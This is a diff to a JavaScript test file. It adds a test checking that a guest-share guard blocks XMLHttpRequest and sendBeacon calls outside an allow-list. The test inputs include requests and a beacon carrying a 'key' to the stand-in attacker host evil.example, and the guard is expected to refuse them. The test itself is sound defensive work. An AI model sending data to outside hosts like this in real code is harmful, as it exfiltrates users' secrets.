@@ -264,6 +264,41 @@ test('the fetch guard refuses everything but the share\'s own operations', async
   assert.deepEqual(reached, ['POST /ax-inbox/_search', 'GET /ax-inbox/_mapping', 'GET /_graph/inbox/ego?node=x']);
 });
 
+test('the guard also covers XMLHttpRequest and sendBeacon — same allow-list, same origin rule', () => {
+  // PR #945 review: only `fetch` was wrapped; an XHR from page code reached
+  // the server (and got 401 there). The guard is a tripwire, not the boundary,
+  // but a tripwire with a hole is a false statement in the docs.
+  const s = share();
+  const opened = [];
+  const beaconed = [];
+  class FakeXHR { open(method, url) { opened.push(`${method} ${url}`); } }
+  const win = {
+    location: { href: 'http://localhost:9550/_xerj-console/#/reader', origin: 'http://localhost:9550' },
+    Response: globalThis.Response, DOMException: globalThis.DOMException,
+    fetch: async () => new Response('{}', { status: 200 }),
+    XMLHttpRequest: FakeXHR,
+    navigator: { sendBeacon: (url) => { beaconed.push(url); return true; } },
+  };
+  installGuestGuard(s, win);
+  installGuestGuard(s, win);
+  const x = new FakeXHR();
+  for (const [m, u] of [['GET', '/_xerj-console/api/v1/me'], ['POST', '/other/_search'], ['GET', 'https://evil.example/k'], ['DELETE', '/ax-inbox'], ['GET', '/_cat/indices']]) {
+    assert.throws(() => x.open(m, u), (e) => e.name === 'SecurityError', `${m} ${u}`);
+  }
+  assert.deepEqual(opened, [], 'nothing refused reached XMLHttpRequest.open');
+  x.open('POST', '/ax-inbox/_search'); x.open('get', '/ax-inbox/_mapping'); x.open('GET', '/_graph/inbox/ego?node=x');
+  assert.deepEqual(opened, ['POST /ax-inbox/_search', 'get /ax-inbox/_mapping', 'GET /_graph/inbox/ego?node=x'], 'the share\'s own operations pass through unchanged');
+  assert.equal(win.navigator.sendBeacon('https://evil.example/b', 'key'), false);
+  assert.equal(win.navigator.sendBeacon('/_xerj-console/api/v1/audit', 'key'), false);
+  assert.equal(win.navigator.sendBeacon('/ax-inbox/_count'), true, 'a beacon to a share operation is the same POST the guard already allows');
+  assert.deepEqual(beaconed, ['/ax-inbox/_count']);
+  assert.deepEqual(win.__xerjGuestBlocked, [
+    'XHR GET /_xerj-console/api/v1/me', 'XHR POST /other/_search', 'XHR GET https://evil.example', 'XHR DELETE /ax-inbox', 'XHR GET /_cat/indices',
+    'BEACON POST https://evil.example', 'BEACON POST /_xerj-console/api/v1/audit',
+  ]);
+  assert.ok(win.XMLHttpRequest.prototype.open.__xerjGuestGuard && win.navigator.sendBeacon.__xerjGuestGuard);
+});
+
 test('expiry fires once, re-checks the clock, and survives long timers', () => {
   const s = share({ expires_at: NOW + 150_000 });
   let now = NOW;
